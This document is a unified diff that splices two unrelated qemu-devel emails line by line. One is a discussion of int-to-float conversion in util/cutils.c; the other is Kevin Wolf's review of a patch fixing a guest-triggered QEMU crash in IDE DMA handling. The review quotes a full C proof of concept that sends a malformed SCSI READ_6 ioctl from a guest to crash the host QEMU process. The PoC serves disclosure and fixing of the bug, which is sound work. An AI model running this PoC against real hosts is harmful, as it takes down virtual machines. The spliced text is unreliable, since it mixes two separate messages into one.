@@ -2,83 +2,78 @@ Return-Path: <SRS0=OA/w=ZN=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.ker
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 X-Spam-Level: 
-X-Spam-Status: No, score=-3.5 required=3.0 tests=DKIM_INVALID,DKIM_SIGNED,
-	HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,SPF_HELO_NONE,
-	SPF_PASS,URIBL_BLOCKED autolearn=no autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=-8.0 required=3.0 tests=DKIM_INVALID,DKIM_SIGNED,
+	HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,
+	SPF_HELO_NONE,SPF_PASS,URIBL_BLOCKED,USER_AGENT_SANE_1 autolearn=ham
+	autolearn_force=no version=3.4.0
 Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 8AD33C432C0
-	for <qemu-devel@archiver.kernel.org>; Thu, 21 Nov 2019 14:51:58 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 819EDC432C0
+	for <qemu-devel@archiver.kernel.org>; Thu, 21 Nov 2019 15:05:35 +0000 (UTC)
 Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by mail.kernel.org (Postfix) with ESMTPS id 58775206DA
-	for <qemu-devel@archiver.kernel.org>; Thu, 21 Nov 2019 14:51:58 +0000 (UTC)
+	by mail.kernel.org (Postfix) with ESMTPS id 49AB1206EC
+	for <qemu-devel@archiver.kernel.org>; Thu, 21 Nov 2019 15:05:35 +0000 (UTC)
 Authentication-Results: mail.kernel.org;
-	dkim=fail reason="signature verification failed" (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="TxiiFEJC"
-DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 58775206DA
+	dkim=fail reason="signature verification failed" (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="MDcc/mbF"
+DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 49AB1206EC
 Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=redhat.com
 Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
-Received: from localhost ([::1]:41562 helo=lists1p.gnu.org)
+Received: from localhost ([::1]:41656 helo=lists1p.gnu.org)
 	by lists.gnu.org with esmtp (Exim 4.90_1)
 	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
-	id 1iXnoL-0002XO-Cf
-	for qemu-devel@archiver.kernel.org; Thu, 21 Nov 2019 09:51:57 -0500
-Received: from eggs.gnu.org ([2001:470:142:3::10]:44098)
+	id 1iXo1W-0007xJ-Dv
+	for qemu-devel@archiver.kernel.org; Thu, 21 Nov 2019 10:05:34 -0500
+Received: from eggs.gnu.org ([2001:470:142:3::10]:46262)
  by lists.gnu.org with esmtp (Exim 4.90_1)
- (envelope-from <armbru@redhat.com>) id 1iXnne-000233-6z
- for qemu-devel@nongnu.org; Thu, 21 Nov 2019 09:51:15 -0500
+ (envelope-from <kwolf@redhat.com>) id 1iXo0J-0007IZ-7K
+ for qemu-devel@nongnu.org; Thu, 21 Nov 2019 10:04:20 -0500
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
- (envelope-from <armbru@redhat.com>) id 1iXnnc-0002bK-Ez
- for qemu-devel@nongnu.org; Thu, 21 Nov 2019 09:51:13 -0500
-Received: from us-smtp-delivery-1.mimecast.com ([207.211.31.120]:43748
+ (envelope-from <kwolf@redhat.com>) id 1iXo0G-0003xa-LD
+ for qemu-devel@nongnu.org; Thu, 21 Nov 2019 10:04:17 -0500
+Received: from us-smtp-delivery-1.mimecast.com ([207.211.31.120]:50055
  helo=us-smtp-1.mimecast.com)
  by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
- (Exim 4.71) (envelope-from <armbru@redhat.com>) id 1iXnnc-0002b2-7F
- for qemu-devel@nongnu.org; Thu, 21 Nov 2019 09:51:12 -0500
+ (Exim 4.71) (envelope-from <kwolf@redhat.com>) id 1iXo0C-0003vj-Nq
+ for qemu-devel@nongnu.org; Thu, 21 Nov 2019 10:04:12 -0500
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
- s=mimecast20190719; t=1574347871;
+ s=mimecast20190719; t=1574348650;
  h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
  to:to:cc:cc:mime-version:mime-version:content-type:content-type:
  content-transfer-encoding:content-transfer-encoding:
  in-reply-to:in-reply-to:references:references;
- bh=paLSyZxOfMio20kGhLQZQFPFJ9RlwqOzJ0E0TrMxmeo=;
- b=TxiiFEJCxFT9GVuWwEjdPmz52V3wKL2BVOU145WU7BYNHYQdy2hIy/ZC0bPTmwipdxcIbi
- aNJw6d1rt5MvVVffXcYO/JqVxOLfI1m9ZYt/q7t+aia+ZykCYmmLYP2QSUuljyZ7V8n2ub
- eSP+ahNKRdlXudCWMnRrFrXFgy11zBE=
+ bh=eNTACw1FdG1ZxsTF+amglgHri/cUR+NOisoOI1Spjzw=;
+ b=MDcc/mbFGBXCFBr7j6vgJyf/FT5X9XgMCYhcjpTVHtcFHjxr/D97VNnHgDcHgr7Qpw6NnA
+ NZrpHEjL/aZsF/adYmI8eAZ9AUUKElLNfrQ8kuxnUaldRMSqkKnDY1aNRwiHXjkV6Cb0sE
+ JuLNoMLWJqS5O2X2/WuzaTJYTymu4jc=
 Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
  [209.132.183.4]) (Using TLS) by relay.mimecast.com with ESMTP id
- us-mta-395-UYl5O1uaOpSTWuyxsk44XA-1; Thu, 21 Nov 2019 09:51:07 -0500
+ us-mta-169-Vn9_3oYbN6mvr41T67otdA-1; Thu, 21 Nov 2019 10:04:07 -0500
 Received: from smtp.corp.redhat.com (int-mx01.intmail.prod.int.phx2.redhat.com
  [10.5.11.11])
  (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
  (No client certificate requested)
- by mimecast-mx01.redhat.com (Postfix) with ESMTPS id 5D52B8018A3;
- Thu, 21 Nov 2019 14:51:06 +0000 (UTC)
-Received: from blackfin.pond.sub.org (ovpn-116-134.ams2.redhat.com
- [10.36.116.134])
- by smtp.corp.redhat.com (Postfix) with ESMTPS id 004C660BDB;
- Thu, 21 Nov 2019 14:51:05 +0000 (UTC)
-Received: by blackfin.pond.sub.org (Postfix, from userid 1000)
- id 7648B1138606; Thu, 21 Nov 2019 15:51:04 +0100 (CET)
-From: Markus Armbruster <armbru@redhat.com>
-To: Richard Henderson <richard.henderson@linaro.org>
-Subject: Re: [PATCH] Fix incorrect int->float conversions caught by clang
- -Wimplicit-int-float-conversion
-References: <20191116010731.3jdxozzfpsqsrcc4@google.com>
- <87tv6z7vb0.fsf@dusky.pond.sub.org> <87pnhmol25.fsf@trasno.org>
- <20191120173018.4jahw3pei3zcupvo@gmail.com>
- <f193df45-e4e7-808d-af20-cb98d8fcf96a@linaro.org>
-Date: Thu, 21 Nov 2019 15:51:04 +0100
-In-Reply-To: <f193df45-e4e7-808d-af20-cb98d8fcf96a@linaro.org> (Richard
- Henderson's message of "Thu, 21 Nov 2019 13:18:17 +0100")
-Message-ID: <87mucpb7vr.fsf@dusky.pond.sub.org>
-User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/26.2 (gnu/linux)
+ by mimecast-mx01.redhat.com (Postfix) with ESMTPS id 1616210054E3;
+ Thu, 21 Nov 2019 15:04:06 +0000 (UTC)
+Received: from linux.fritz.box (ovpn-117-225.ams2.redhat.com [10.36.117.225])
+ by smtp.corp.redhat.com (Postfix) with ESMTPS id 9332260141;
+ Thu, 21 Nov 2019 15:03:54 +0000 (UTC)
+Date: Thu, 21 Nov 2019 16:03:52 +0100
+From: Kevin Wolf <kwolf@redhat.com>
+To: Alexander Popov <alex.popov@linux.com>
+Subject: Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to
+ prevent qemu DoS from quests
+Message-ID: <20191121150352.GH6007@linux.fritz.box>
+References: <20191114172531.10644-1-alex.popov@linux.com>
 MIME-Version: 1.0
+In-Reply-To: <20191114172531.10644-1-alex.popov@linux.com>
+User-Agent: Mutt/1.12.1 (2019-06-15)
 X-Scanned-By: MIMEDefang 2.79 on 10.5.11.11
-X-MC-Unique: UYl5O1uaOpSTWuyxsk44XA-1
+X-MC-Unique: Vn9_3oYbN6mvr41T67otdA-1
 X-Mimecast-Spam-Score: 0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: text/plain; charset=WINDOWS-1252
 Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
 X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
  [fuzzy]
 X-Received-From: 207.211.31.120
@@ -93,82 +88,136 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
  <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
-Cc: Fangrui Song <i@maskray.me>, qemu-devel@nongnu.org,
- "Dr. David Alan Gilbert" <dgilbert@redhat.com>,
- Juan Quintela <quintela@redhat.com>
+Cc: Andrea Arcangeli <aarcange@redhat.com>, sstabellini@kernel.org,
+ pmatouse@redhat.com, mdroth@linux.vnet.ibm.com, qemu-block@nongnu.org,
+ "Michael S . Tsirkin" <mst@redhat.com>, qemu-stable@nongnu.org,
+ qemu-devel@nongnu.org, Kashyap Chamarthy <kashyap.cv@gmail.com>,
+ Paolo Bonzini <pbonzini@redhat.com>, John Snow <jsnow@redhat.com>,
+ pjp@redhat.com
 Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
 Sender: "Qemu-devel"
  <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>
 
-Richard Henderson <richard.henderson@linaro.org> writes:
+Am 14.11.2019 um 18:25 hat Alexander Popov geschrieben:
+> The commit a718978ed58a from July 2015 introduced the assertion which
+> implies that the size of successful DMA transfers handled in ide_dma_cb()
+> should be multiple of 512 (the size of a sector). But guest systems can
+> initiate DMA transfers that don't fit this requirement.
+>=20
+> PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
+> command and crash qemu:
+>=20
+> #include <stdio.h>
+> #include <sys/ioctl.h>
+> #include <stdint.h>
+> #include <sys/types.h>
+> #include <sys/stat.h>
+> #include <fcntl.h>
+> #include <string.h>
+> #include <stdlib.h>
+> #include <scsi/scsi.h>
+> #include <scsi/scsi_ioctl.h>
+>=20
+> #define CMD_SIZE 2048
+>=20
+> struct scsi_ioctl_cmd_6 {
+> =09unsigned int inlen;
+> =09unsigned int outlen;
+> =09unsigned char cmd[6];
+> =09unsigned char data[];
+> };
+>=20
+> int main(void)
+> {
+> =09intptr_t fd =3D 0;
+> =09struct scsi_ioctl_cmd_6 *cmd =3D NULL;
+>=20
+> =09cmd =3D malloc(CMD_SIZE);
+> =09if (!cmd) {
+> =09=09perror("[-] malloc");
+> =09=09return 1;
+> =09}
+>=20
+> =09memset(cmd, 0, CMD_SIZE);
+> =09cmd->inlen =3D 1337;
+> =09cmd->cmd[0] =3D READ_6;
+>=20
+> =09fd =3D open("/dev/sg0", O_RDONLY);
+> =09if (fd =3D=3D -1) {
+> =09=09perror("[-] opening sg");
+> =09=09return 1;
+> =09}
+>=20
+> =09printf("[+] sg0 is opened\n");
+>=20
+> =09printf("[.] qemu should break here:\n");
+> =09fflush(stdout);
+> =09ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
+> =09printf("[-] qemu didn't break\n");
+>=20
+> =09free(cmd);
+>=20
+> =09return 1;
+> }
 
-> On 11/20/19 6:30 PM, Fangrui Song wrote:
->> On 2019-11-20, Juan Quintela wrote:
->>> Markus Armbruster <armbru@redhat.com> wrote:
->>>> Fangrui Song <i@maskray.me> writes:
-[...]
->>>>> diff --git a/util/cutils.c b/util/cutils.c
->>>>> index fd591cadf0..2b4484c015 100644
->>>>> --- a/util/cutils.c
->>>>> +++ b/util/cutils.c
->>>>> @@ -239,10 +239,10 @@ static int do_strtosz(const char *nptr, const c=
-har
->>>>> **end,
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 goto out;
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 }
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 /*
->>>>> -=C2=A0=C2=A0=C2=A0=C2=A0 * Values >=3D 0xfffffffffffffc00 overflow u=
-int64_t after their trip
->>>>> +=C2=A0=C2=A0=C2=A0=C2=A0 * Values > nextafter(0x1p64, 0) overflow ui=
-nt64_t after their trip
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 * through double (53 bits of pre=
-cision).
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 */
->>>>> -=C2=A0=C2=A0=C2=A0 if ((val * mul >=3D 0xfffffffffffffc00) || val < =
-0) {
->>>>> +=C2=A0=C2=A0=C2=A0 if ((val * mul > nextafter(0x1p64, 0)) || val < 0=
-) {
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 retval =3D -ER=
-ANGE;
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 goto out;
->>>>> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 }
->>>
->>> This comment was really bad (it says the same that the code).
->>> On the other hand, I can *kind of* understand what does 0xffff<more
->>> f's here>.
->>>
->>> But I am at a complete loss about what value is:
->>>
->>> nextafter(0x1p64, 0).
->>>
->>> Can we put what value is that instead?
->>=20
->> It is a C99 hexadecimal floating-point literal.
->> 0x1p64 represents hex fraction 1.0 scaled by 2**64, that is 2**64.
->>=20
->> We can write this as `val * mul > 0xfffffffffffff800p0`, but I feel that
->> counting the number of f's is error-prone and is not fun.
->>=20
->> (We cannot use val * mul >=3D 0x1p64.
->> If FLT_EVAL_METHOD =3D=3D 2, the intermediate computation val * mul will=
- be
->> performed at long double precision, val * mul may not by representable
->> by a double and will overflow as (double)0x1p64.)
->
-> I agree about not spelling out the f's, or the 0x800 at the end.  That's
-> something that the compiler can do for us, resolving this standard librar=
-y
-> function at compile-time.
->
-> We just need a better comment.  Perhaps:
->
->     /*
->      * Values near UINT64_MAX overflow to 2**64 when converting
->      * to double precision.  Compare against the maximum representable
->      * double precision value below 2**64, computed as "the next value
->      * after 2**64 (0x1p64) in the direction of 0".
->      */
+It would be nicer to turn the reproducer into a test case for
+tests/ide-test.c.
 
-Yes, please.
+> For fixing that let's check the number of bytes prepared for the transfer
+> by the prepare_buf() handler. If it is not a multiple of 512 then end
+> the DMA transfer with an error.
+>=20
+> That also fixes the I/O stall in guests after a DMA transfer request
+> for less than the size of a sector.
+>=20
+> Signed-off-by: Alexander Popov <alex.popov@linux.com>
+
+This patch makes ide-test fail:
+
+  TEST    check-qtest-x86_64: tests/ide-test
+**
+ERROR:tests/ide-test.c:469:test_bmdma_short_prdt: assertion failed (status =
+=3D=3D 0): (0x00000004 =3D=3D 0x00000000)
+ERROR - Bail out! ERROR:tests/ide-test.c:469:test_bmdma_short_prdt: asserti=
+on failed (status =3D=3D 0): (0x00000004 =3D=3D 0x00000000)
+
+> diff --git a/hw/ide/core.c b/hw/ide/core.c
+> index 754ff4dc34..85aac614f0 100644
+> --- a/hw/ide/core.c
+> +++ b/hw/ide/core.c
+> @@ -849,6 +849,7 @@ static void ide_dma_cb(void *opaque, int ret)
+>      int64_t sector_num;
+>      uint64_t offset;
+>      bool stay_active =3D false;
+> +    int32_t prepared =3D 0;
+> =20
+>      if (ret =3D=3D -EINVAL) {
+>          ide_dma_error(s);
+> @@ -892,12 +893,10 @@ static void ide_dma_cb(void *opaque, int ret)
+>      n =3D s->nsector;
+>      s->io_buffer_index =3D 0;
+>      s->io_buffer_size =3D n * 512;
+> -    if (s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size) < =
+512) {
+> -        /* The PRDs were too short. Reset the Active bit, but don't rais=
+e an
+> -         * interrupt. */
+> -        s->status =3D READY_STAT | SEEK_STAT;
+> -        dma_buf_commit(s, 0);
+> -        goto eot;
+> +    prepared =3D s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer=
+_size);
+> +    if (prepared % 512) {
+> +        ide_dma_error(s);
+
+Which I assume is because you changed the error mode here compared to
+the old version.
+
+I'm not sure offhand what the correct behaviour is for non-aligned
+values > 512. I think we actually have two cases here: Either a short or
+a long PRD. The commit message should explain this with spec references
+and a test case should be added for both cases.
+
+Kevin
 
 
